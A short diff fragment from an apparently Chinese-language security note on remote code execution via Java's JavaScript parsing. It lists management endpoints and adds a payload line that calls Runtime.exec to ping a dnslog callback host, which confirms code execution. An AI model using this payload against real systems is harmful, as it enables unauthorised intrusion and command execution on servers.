@@ -33,6 +33,10 @@ java解析js的RCE，java17如果默认不支持解析js。
 工作流
 /manager/model/list
 /manager/model/edit
+
+
+
+java.lang.Runtime.getRuntime().exec("ping hng2al.dnslog.cn");
 ```
 
 
